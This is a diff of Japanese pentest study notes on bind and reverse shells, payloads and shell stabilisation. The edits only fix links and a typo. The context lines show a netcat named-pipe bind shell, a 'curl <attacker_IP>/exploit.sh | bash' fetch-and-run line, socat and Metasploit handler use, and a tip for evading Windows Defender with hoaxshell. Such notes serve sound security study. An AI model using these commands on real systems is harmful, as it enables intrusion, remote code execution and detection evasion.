@@ -11,7 +11,7 @@
 
 - シェルとは、コマンドライン環境(CLI)に接続し、操作する際に使用するものを表す
 - Linux でよく使われる bash や sh はシェルの一種であり、Windows の cmd.exe や Powershell もシェルの一種
-- sh / bash / zsh：shは元祖、bashはshを機能拡張したもの、zshは最上位の機能を持つ
+- sh / bash / zsh：shは元祖、bashはshを機能拡張したもの、zshはbashを拡張したシェルで、高度なカスタマイズ性・補完機能・プラグインエコシステムが特徴
 
 ## インタラクティブシェル/非インタラクティブシェルとは
 
@@ -93,7 +93,7 @@ $$左が攻撃側、右がターゲット側$$
 ### Bind Shell for Linux
 
 1. ターゲットマシン上でリスナーを用意する
-	 ([補足：名前付きパイプコマンドの解説](#補足：名前付きパイプコマンドの解説))
+	 ([補足：名前付きパイプコマンドの解説](Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#補足：名前付きパイプコマンドの解説))
 ```zsh
 mkfifo /tmp/f; nc -lvnp <Port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
@@ -313,13 +313,13 @@ sudo rlwrap nc -lvnp <Port>
 curl <attacker_IP>/exploit.sh | bash
 ```
 
-5. リバースシェルを確立したら、[安定化 w/ Python](#安定化%20w/%20Python)へ進む
+5. リバースシェルを確立したら、[安定化 w/ Python](Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#安定化%20w/%20Python)へ進む
 
 ---
 
 ## 🪟 Windowsターゲット向け安定化
 
-Windowsでは安定化する手法が限られており、効果的な手法は`rlwrap`でリスナーをセットアップするか、[Metasploit - multi/handler](#Metasploit%20-%20multi/handler)を使う
+Windowsでは安定化する手法が限られており、効果的な手法は`rlwrap`でリスナーをセットアップするか、[Metasploit - multi/handler](Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Metasploit%20-%20multi/handler)を使う
 
 その他、PowerShellのエンコーディングの問題や文字化け解消に使えるテクニック
 ```powershell
@@ -428,7 +428,7 @@ socat TCP:<target_IP>:<Port> -
 🔗[Nishang - GitHub](https://github.com/samratashok/nishang)
 
 - 目的：Windowsマシンへの侵害後、永続化のため
-	- [Base64化したPowerShellリバースシェルワンライナー](#Base64化したPowerShellリバースシェルワンライナー)などがうまくいかないときに使う
+	- [Base64化したPowerShellリバースシェルワンライナー](Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)などがうまくいかないときに使う
 
 1. 攻撃者のマシンでリバースシェルペイロードスクリプトを用意する
 ```zsh
@@ -472,7 +472,7 @@ Metasploitフレームワークの `exploit/multi/handler` モジュールは、
 - ✅ ファイルのアップロード・ダウンロードなど多くの機能を内蔵している
 - ❌ Meterpreterシェルは必ずMetasploit経由の通信が必要（通常のシェルペイロードはncでも受信可能）
 
-**Meterpreterシェルを使用したい場合は必須。** ステージドペイロードを使用する場合も、このハンドラを使用する（[☠️Msfvenom](#) 参照）。
+**Meterpreterシェルを使用したい場合は必須。** ステージドペイロードを使用する場合も、このハンドラを使用する（[☠️Msfvenom](Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#) 参照）。
 
 >[!Info]
 >Meterpreterシェルとは、Metasploit独自の高機能シェル。
@@ -542,5 +542,5 @@ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
 
 > [!Tip] Defender検知回避
 >  - [hoaxshell - GitHub](https://github.com/t3l3machus/hoaxshell)を使う
->  - ✅HTTP/HTTPSのアウトバンド通信のみを使うことで<u>Web通信に見せかける</u>ため、検知されにくい（通常のリバースシェルであればTCP通信）
+>  - ✅HTTP/HTTPSのアウトバウンド通信のみを使うことで<u>Web通信に見せかける</u>ため、検知されにくい（通常のリバースシェルであればTCP通信）
 >  - ❌安定性、即応性はTCP接続のほうが高い
